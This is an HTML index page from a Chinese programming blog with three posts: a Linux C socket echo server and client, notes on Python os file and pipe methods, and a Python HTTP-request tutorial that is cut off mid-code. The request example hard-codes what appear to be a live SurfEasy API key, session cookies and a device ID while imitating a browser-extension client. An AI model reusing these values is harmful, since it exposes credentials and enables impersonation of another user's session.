<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />






  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta name="description" content="Try your best!">
<meta property="og:type" content="website">
<meta property="og:title" content="上善若水">
<meta property="og:url" content="http://yoursite.com/page/8/index.html">
<meta property="og:site_name" content="上善若水">
<meta property="og:description" content="Try your best!">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="上善若水">
<meta name="twitter:description" content="Try your best!">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.2',
    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":true,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/8/"/>





  <title>上善若水 - 古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">上善若水</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/04/c-socket编程/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/04/c-socket编程/" itemprop="url">socket编程</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-04T22:25:45+08:00">
                2017-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Linux下的socket编程"><a href="#Linux下的socket编程" class="headerlink" title="Linux下的socket编程"></a>Linux下的socket编程</h3><h4 id="server-c"><a href="#server-c" class="headerlink" title="server.c"></a>server.c</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LINE 1024</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INET_ADDR_STR 16 </span></div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_fun</span><span class="params">(<span class="keyword">char</span> *p)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>( ; *p != <span class="string">'\0'</span> ; p++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>((*p &gt;= <span class="string">'a'</span>) &amp;&amp; (*p &lt;= <span class="string">'z'</span>))</div><div class="line">        &#123;</div><div class="line">            *p = *p - <span class="number">32</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span>     <span class="comment">//服务器通信地址结构</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cin</span>;</span>     <span class="comment">//保存客户端通信地址结构</span></div><div class="line">    <span class="keyword">int</span> l_fd;</div><div class="line">    <span class="keyword">int</span> c_fd;</div><div class="line">    <span class="keyword">socklen_t</span> len;</div><div class="line">    <span class="keyword">char</span> buf[MAX_LINE];     <span class="comment">//存储传送内容的缓冲区</span></div><div class="line">    <span class="keyword">char</span> addr_p[INET_ADDR_STR]; <span class="comment">//存储客户端地址的缓冲区</span></div><div class="line">    <span class="keyword">int</span> port = <span class="number">8000</span>;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    bzero((<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;   <span class="comment">//使用IPV4通信域</span></div><div class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = INADDR_ANY;   <span class="comment">//服务器可以接受任意地址</span></div><div class="line">    <span class="built_in">sin</span>.sin_port = htons(port); <span class="comment">//端口转换为网络字节序</span></div><div class="line">     </div><div class="line">    l_fd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);   <span class="comment">//创建套接子,使用TCP协议</span></div><div class="line">    bind(l_fd,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line">     </div><div class="line">    listen(l_fd,<span class="number">10</span>);    <span class="comment">//开始监听连接</span></div><div class="line">     </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"waiting ....\n"</span>);</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        c_fd = accept(l_fd,(struct sockaddr *)&amp;<span class="built_in">cin</span>,&amp;len);</div><div class="line">         </div><div class="line">        n = read(c_fd,buf,MAX_LINE);    <span class="comment">//读取客户端发送来的信息</span></div><div class="line">        inet_ntop(AF_INET,&amp;<span class="built_in">cin</span>.sin_addr,addr_p,INET_ADDR_STR);      <span class="comment">//将客户端传来地址转化为字符串</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"client IP is %s,port is %d\n"</span>,addr_p,ntohs(<span class="built_in">cin</span>.sin_port));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"content is : %s\n"</span>, buf);   <span class="comment">//打印客户端发送过来的数据</span></div><div class="line">        my_fun(buf);</div><div class="line">        write(c_fd,buf,n);          <span class="comment">//转换后发给客户端</span></div><div class="line"> </div><div class="line">        close(c_fd);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"buf = %s\n"</span>,buf);</div><div class="line">    <span class="keyword">if</span>((close(l_fd)) == <span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"fail to close\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="client-c"><a href="#client-c" class="headerlink" title="client.c"></a>client.c</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"> </div><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LINE 1024</span></div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span>     <span class="comment">//服务器的地址</span></div><div class="line">    <span class="keyword">char</span> buf[MAX_LINE];</div><div class="line">    <span class="keyword">int</span> sfd;</div><div class="line">    <span class="keyword">int</span> port = <span class="number">8000</span>;</div><div class="line">    <span class="keyword">char</span> *str = <span class="string">"test string"</span>;</div><div class="line">    <span class="keyword">char</span> *serverIP = <span class="string">"127.0.0.1"</span>;</div><div class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        str = argv[<span class="number">1</span>];  <span class="comment">//读取用户输入的字符串</span></div><div class="line">    &#125;</div><div class="line">    bzero((<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;   <span class="comment">//使用IPV4地址族</span></div><div class="line">     </div><div class="line">    inet_pton(AF_INET,serverIP,(<span class="keyword">void</span> *)&amp;(<span class="built_in">sin</span>.sin_addr));</div><div class="line">    <span class="built_in">sin</span>.sin_port = htons(port);</div><div class="line">     </div><div class="line">    sfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</div><div class="line">     </div><div class="line">    connect(sfd,(struct sockaddr *)&amp;(<span class="built_in">sin</span>),<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line"> </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"str = %s\n"</span> , str);</div><div class="line">    write(sfd , str , <span class="built_in">strlen</span>(str) + <span class="number">1</span>);</div><div class="line">    read(sfd , buf , MAX_LINE);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"recive from server: %s\n"</span> , buf);</div><div class="line"> </div><div class="line">    close(sfd);</div><div class="line">     </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/04/python-OS-文件-目录方法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/04/python-OS-文件-目录方法/" itemprop="url">python OS 文件/目录方法</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-04T21:28:26+08:00">
                2017-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>os</strong> 模块提供了非常丰富的方法用来处理文件和目录。</p>
<h4 id="os-pipe"><a href="#os-pipe" class="headerlink" title="os.pipe()"></a><a href="http://www.runoob.com/python/os-pipe.html" target="_blank" rel="external">os.pipe()</a></h4><p>创建一个管道，返回一对文件描述符(r,w)分别为读和写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">stdinr,stdinw = os.pipe()</div><div class="line">stderrr,stderrw = os.pipe()</div><div class="line">os.write(stdinw, <span class="string">"\x00\x0a\x00\xff"</span>)</div><div class="line">os.write(stderrw, <span class="string">"\x00\x0a\x02\xff"</span>)</div><div class="line"></div><div class="line">proc = subprocess.Popen([<span class="string">"./input"</span>] + args, env=dict(os.environ, **env), stdin=stdinr, stderr=stderrr)</div></pre></td></tr></table></figure>
<blockquote>
<p>上述表示从标准输入中读入&quot;\x00\x0a\x00\xff&quot;，从标准错误中读入&quot;\x00\x0a\x02\xff&quot;</p>
</blockquote>
<h4 id="os-popen-command-mode-bufsize"><a href="#os-popen-command-mode-bufsize" class="headerlink" title="[os.popen(command, mode[, bufsize]])"></a>[os.popen(command<a href="http://www.runoob.com/python/os-popen.html" target="_blank" rel="external">, mode[, bufsize]])</a></h4><p>从一个 command 打开一个管道</p>
<ul>
<li><strong>command</strong> -- 使用的命令。</li>
<li><strong>mode</strong> -- 模式权限可以是 &#39;r&#39;(默认) 或 &#39;w&#39;。</li>
<li><strong>bufsize</strong> -- 指明了文件需要的缓冲大小：0意味着无缓冲；1意味着行缓冲；其它正值表示使用参数大小的缓冲（大概值，以字节为单位）。负的bufsize意味着使用系统的默认值，一般来说，对于tty设备，它是行缓冲；对于其它文件，它是全缓冲。如果没有改参数，使用系统的默认值。</li>
</ul>
<p><strong>返回值</strong></p>
<p>​    返回一个文件描述符号为fd的打开的文件对象</p>
<h4 id="os-open-file-flags-mode"><a href="#os-open-file-flags-mode" class="headerlink" title="os.open(file, flags[, mode])"></a><a href="http://www.runoob.com/python/os-open.html" target="_blank" rel="external">os.open(file, flags[, mode])</a></h4><p>打开一个文件，并且设置需要的打开选项，mode参数是可选的</p>
<ul>
<li><strong>file</strong> -- 要打开的文件</li>
<li><strong>flags</strong> -- 该参数可以是以下选项，多个使用 &quot;|&quot; 隔开：<ul>
<li><strong>os.O_RDONLY:</strong> 以只读的方式打开</li>
<li><strong>os.O_WRONLY:</strong> 以只写的方式打开</li>
<li><strong>os.O_RDWR :</strong> 以读写的方式打开</li>
<li><strong>os.O_NONBLOCK:</strong> 打开时不阻塞</li>
<li><strong>os.O_APPEND:</strong> 以追加的方式打开</li>
<li><strong>os.O_CREAT:</strong> 创建并打开一个新文件</li>
<li><strong>os.O_TRUNC:</strong> 打开一个文件并截断它的长度为零（必须有写权限）</li>
<li><strong>os.O_EXCL:</strong> 如果指定的文件存在，返回错误</li>
<li><strong>os.O_SHLOCK:</strong> 自动获取共享锁</li>
<li><strong>os.O_EXLOCK:</strong> 自动获取独立锁</li>
<li><strong>os.O_DIRECT:</strong> 消除或减少缓存效果</li>
<li><strong>os.O_FSYNC :</strong> 同步写入</li>
<li><strong>os.O_NOFOLLOW:</strong> 不追踪软链接</li>
</ul>
</li>
<li><strong>mode</strong> -- 类似 <a href="http://www.runoob.com/python/os-chmod.html" target="_blank" rel="external">chmod()</a>。</li>
</ul>
<p><strong>返回值</strong></p>
<p>返回新打开文件的描述符。</p>
<h4 id="os-read-fd-n"><a href="#os-read-fd-n" class="headerlink" title="os.read(fd, n)"></a><a href="http://www.runoob.com/python/os-read.html" target="_blank" rel="external">os.read(fd, n)</a></h4><p>从文件描述符 fd 中读取最多 n 个字节，返回包含读取字节的字符串，文件描述符 fd对应文件已达到结尾, 返回一个空字符串。</p>
<h4 id="os-write-fd-str"><a href="#os-write-fd-str" class="headerlink" title="os.write(fd, str)"></a><a href="http://www.runoob.com/python/os-write.html" target="_blank" rel="external">os.write(fd, str)</a></h4><p>写入字符串到文件描述符 fd中. 返回实际写入的字符串长度</p>
<h4 id="os-close-fd"><a href="#os-close-fd" class="headerlink" title="os.close(fd)"></a><a href="http://www.runoob.com/python/os-close.html" target="_blank" rel="external">os.close(fd)</a></h4><p>关闭文件描述符 fd</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/01/python中网络请求方式总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/01/python中网络请求方式总结/" itemprop="url">python中网络请求方式总结</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-01T16:39:10+08:00">
                2017-09-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>python中能够发请求的包有很多种，有urllib、urllib2、urllib3、requests等，而且仅这几个python库，就能衍生出上百种请求方法，一一赘述明显不合适，这里仅仅讲述基础方法以及我所遇到的问题。</p>
<h4 id="发送multipart-form-data-数据"><a href="#发送multipart-form-data-数据" class="headerlink" title="发送multipart/form-data; 数据"></a>发送<code>multipart/form-data;</code> 数据</h4><p>有许多种情形下需要发送multipart/form-data数据，如文件上传、网络验证等</p>
<h5 id="方法一：用urllib2请求"><a href="#方法一：用urllib2请求" class="headerlink" title="方法一：用urllib2请求"></a>方法一：用urllib2请求</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line">header=&#123;</div><div class="line">    <span class="string">"Host"</span>: <span class="string">"api.surfeasy.com"</span>,</div><div class="line">    <span class="string">"Connection"</span>: <span class="string">"keep-alive"</span>,</div><div class="line">    <span class="string">"SE-Client-Locale"</span>: <span class="string">"zh-CN"</span>,</div><div class="line">    <span class="string">"Origin"</span>: <span class="string">"chrome-extension://odiddbcijempnhhobijfbggjogofdlgl"</span>,</div><div class="line">    <span class="string">"SE-Client-Type"</span>: <span class="string">"se0210"</span>,</div><div class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"</span>,</div><div class="line">    <span class="string">"SE-Client-Name"</span>: <span class="string">"odiddbcijempnhhobijfbggjogofdlgl"</span>,</div><div class="line">    <span class="string">"SE-Operating-System"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"</span>,</div><div class="line">    <span class="string">"SE-Client-API-Key"</span>: <span class="string">"DCF8EF2E5C791C25797F4F862EEF60DA7510BB4847058A8CE6357EFB4E692C79"</span>,</div><div class="line">    <span class="string">"SE-Client-Version"</span>: <span class="string">"1.3.6"</span>,</div><div class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate, br"</span>,</div><div class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8"</span>,</div><div class="line">    <span class="string">"Cookie"</span>: <span class="string">"api_session=BAhJIgGvZXlKcFpDSTZNVGt3TXpZNE1qVXNJbTltSWpvM056YzJNREF3TENKMGF5STZJbU01TW1ObU1UbGtOakppCk1qSXdNekZqWXpjd04yVmlNMlZtTUdWak9Ua3dOR1UwTVRGbFpUWXdNamxoWWpNNFl6QmpNbUptTURKaApNelZtWldWa04yRWlMQ0owYlNJNklqSXdNVGN0TVRFdE16QlVNRFU2TXpnNk1EaGFJbjA9CgY6BkVG--8d2bd7b8fab0d29ff09569e326d806e3d8b5ab22; api_session=BAhJIgGvZXlKcFpDSTZNVGt3TXpZNE1qVXNJbTltSWpvM056YzJNREF3TENKMGF5STZJakZtWlRZMVltRTJZV016Ck1HVXhNMlZtTkRSalpEWTJOMll5WkRJd1l6VmxObVkzTVRoaU4yRXhOakE1WVRWbVkyWTNNMk0wWm1ZMApPVFJqTXpRM1lqVWlMQ0owYlNJNklqSXdNVGN0TVRFdE16QlVNRGM2TURnNk5UUmFJbjA9CgY6BkVG--48a4f3899a63984d4061a64ae9864c8f9ecf2ad6"</span></div><div class="line">    &#125;</div><div class="line">data = <span class="string">'''--123456\r</span></div><div class="line">Content-Disposition: form-data; name="device_id"\r</div><div class="line">\r</div><div class="line">ab197fb4782f20bd5808133bdd8121ecd422ffb6\r</div><div class="line">--123456--\r</div><div class="line">'''</div><div class="line"><span class="comment">#print 